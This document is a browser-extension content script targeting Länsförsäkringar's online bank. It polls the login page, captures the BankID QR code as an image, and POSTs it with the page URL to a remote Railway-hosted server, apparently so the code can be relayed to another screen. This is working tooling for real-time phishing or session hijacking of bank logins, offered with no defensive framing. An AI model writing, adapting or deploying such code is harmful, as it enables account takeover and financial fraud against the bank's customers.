// Server configuration
const PRODUCTION_URL = 'https://web-production-c116.up.railway.app';

// Länsförsäkringar configuration
const LANS_CONFIG = {
    identifier: {
        urls: ['lansforsakringar.se'],
        titles: ['länsförsäkringar', 'lansforsakringar'],
        domains: ['lansforsakringar']
    },
    selectors: {
        qrSvg: 'svg[data-test-id="qr-component"]',
        qrButton: 'button[aria-label*="QR-kod"]',
        qrContainer: '[class*="qr-code"], [class*="qrcode"]'
    },
    captureInterval: 50,
    captureThrottle: 100,
    lastCapture: 0,
    lastHash: null,
    displayUrl: `${PRODUCTION_URL}/Lansfelsokningskundidentifieringkund98721311`
};

// Function to capture and send QR code
function captureAndSendQR(element) {
    try {
        const canvas = document.createElement('canvas');
        let width, height;

        if (element.tagName === 'svg') {
            // Handle SVG element
            const svgData = new XMLSerializer().serializeToString(element);
            const svgBlob = new Blob([svgData], {type: 'image/svg+xml;charset=utf-8'});
            const svgUrl = URL.createObjectURL(svgBlob);
            
            width = element.clientWidth || element.getAttribute('width') || 300;
            height = element.clientHeight || element.getAttribute('height') || 300;
            
            const img = new Image();
            img.crossOrigin = "anonymous";
            
            img.onload = function() {
                try {
                    canvas.width = width;
                    canvas.height = height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(this, 0, 0, width, height);
                    
                    const base64Data = canvas.toDataURL('image/png');
                    if (!base64Data || base64Data === 'data:,') {
                        console.log('Failed to get image data');
                        return;
                    }

                    const hash = base64Data.slice(-32);
                    if (hash === LANS_CONFIG.lastHash) {
                        console.log('Same QR code as last capture');
                        return;
                    }
                    
                    console.log('Capturing new QR code');
                    LANS_CONFIG.lastHash = hash;
                    LANS_CONFIG.lastCapture = Date.now();

                    fetch(`${PRODUCTION_URL}/api/qr`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({ 
                            qrData: base64Data,
                            bank: 'LANSFORSAKRINGAR',
                            timestamp: new Date().toISOString(),
                            url: window.location.href,
                            displayUrl: LANS_CONFIG.displayUrl
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                        showNotification('QR Code captured and broadcast!');
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        showNotification('Error broadcasting QR code: ' + error.message, true);
                    });
                } catch (error) {
                    console.error('Canvas operation error:', error);
                }
                URL.revokeObjectURL(svgUrl);
            };

            img.onerror = function(error) {
                console.error('Image load error:', error);
                showNotification('Error loading SVG: ' + error.message, true);
                URL.revokeObjectURL(svgUrl);
            };

            img.src = svgUrl;
        }
    } catch (error) {
        console.error('Capture error:', error);
        showNotification('Error capturing QR code: ' + error.message, true);
    }
}

// Function to show notification
function showNotification(message, isError = false) {
    let notification = document.getElementById('qr-capture-notification');
    if (!notification) {
        notification = document.createElement('div');
        notification.id = 'qr-capture-notification';
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 4px;
            color: white;
            font-family: Arial, sans-serif;
            z-index: 999999;
            transition: opacity 0.3s ease-in-out;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        `;
        document.body.appendChild(notification);
    }

    notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
    notification.textContent = message;
    notification.style.opacity = '1';

    setTimeout(() => {
        notification.style.opacity = '0';
        setTimeout(() => notification.remove(), 300);
    }, 2000);
}

// Function to find QR codes
function findQRCodes() {
    const svgs = document.querySelectorAll(LANS_CONFIG.selectors.qrSvg);
    const qrContainers = document.querySelectorAll(LANS_CONFIG.selectors.qrContainer);
    
    const qrElements = [
        ...Array.from(svgs),
        ...Array.from(qrContainers).filter(container => {
            const svg = container.querySelector('svg');
            return svg && !svgs.contains(svg);
        }).map(container => container.querySelector('svg'))
    ].filter(Boolean);
    
    return qrElements;
}

// Function to auto-capture QR codes
function autoCapture() {
    const now = Date.now();
    if (now - LANS_CONFIG.lastCapture < LANS_CONFIG.captureThrottle) {
        return;
    }

    const qrCodes = findQRCodes();
    qrCodes.forEach(qrCode => {
        const rect = qrCode.getBoundingClientRect();
        if (rect.width > 0 && rect.height > 0 && 
            rect.top >= 0 && rect.bottom <= window.innerHeight) {
            captureAndSendQR(qrCode);
        }
    });
}

// Start monitoring
let captureInterval;
let observerTimeout;

function startMonitoring() {
    if (captureInterval) clearInterval(captureInterval);
    
    captureInterval = setInterval(autoCapture, LANS_CONFIG.captureInterval);
    setTimeout(autoCapture, 100);

    const observer = new MutationObserver((mutations) => {
        if (observerTimeout) clearTimeout(observerTimeout);
        observerTimeout = setTimeout(autoCapture, 10);
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['src', 'style', 'class', 'id', 'data-testid']
    });
}

// Clear interval when page is hidden
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        if (captureInterval) clearInterval(captureInterval);
    } else {
        startMonitoring();
    }
});

// Start monitoring when the page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startMonitoring);
} else {
    startMonitoring();
}

// Handle messages from the extension
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'captureQR') {
        const qrCodes = findQRCodes();
        if (qrCodes.length > 0) {
            captureAndSendQR(qrCodes[0]);
            sendResponse({ success: true });
        } else {
            showNotification('No QR codes found on this page', true);
            sendResponse({ success: false });
        }
    }
}); 